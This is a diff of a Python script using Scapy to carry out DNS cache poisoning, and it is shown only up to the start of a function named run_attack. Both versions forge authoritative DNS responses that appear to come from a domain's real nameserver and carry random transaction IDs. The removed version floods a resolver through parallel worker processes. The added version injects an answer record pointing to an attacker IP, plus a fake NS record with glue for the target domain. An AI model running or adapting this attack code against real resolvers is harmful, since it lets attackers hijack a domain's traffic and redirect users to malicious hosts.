@@ -1,32 +1,23 @@
 #!/usr/bin/env python3
 import random
 import argparse
-import multiprocessing
-from scapy.all import DNS, DNSQR, DNSRR, IP, UDP, send, sr1, conf
+import threading
+from scapy.all import DNS, DNSQR, DNSRR, IP, UDP, send, sr1
 
-# --- Configuration ---
-# Disable Scapy's verbose output to improve performance
-conf.verb = 0
-
-def spoof_worker(args):
-    """
-    Worker function for a single process.
-    Receives a pre-built DNS payload and sends a specified number of packets in a tight loop.
-    """
-    resolver_ip, real_ns_ip, dns_payload, num_packets_to_send = args
-
-    # This loop is now inside the worker, making it much more efficient.
-    for _ in range(num_packets_to_send):
-        # The only work done in this hot loop is creating the fast IP/UDP layers
-        # and randomizing the necessary fields.
-        packet = IP(src=real_ns_ip, dst=resolver_ip) / \
-                 UDP(sport=53, dport=random.randint(1024, 65535)) / \
-                 dns_payload
-        
-        # Manually set a random transaction ID on the pre-built payload
-        packet[DNS].id = random.randint(1, 65535)
-        
-        send(packet)
+# --- Worker function for sending a single spoofed packet ---
+def send_spoofed_response(resolver_ip, real_ns_ip, target_domain, random_subdomain, attacker_ip, fake_ns_domain):
+    """Crafts and sends one spoofed DNS response packet."""
+    spoofed_response = IP(src=real_ns_ip, dst=resolver_ip) / \
+                       UDP(sport=53, dport=5000) / \
+                       DNS(
+                           id=random.randint(1, 65535),
+                           qr=1, aa=1,
+                           qd=DNSQR(qname=random_subdomain),
+                           an=DNSRR(rrname=random_subdomain, ttl=86400, rdata=attacker_ip),
+                           ns=DNSRR(rrname=target_domain, type='NS', ttl=86400, rdata=fake_ns_domain),
+                           ar=DNSRR(rrname=fake_ns_domain, ttl=86400, rdata=attacker_ip)
+                       )
+    send(spoofed_response, verbose=0)
 
 def run_attack(resolver_ip, attacker_ip, real_ns_ip, target_domain, num_requests, num_responses):
     """
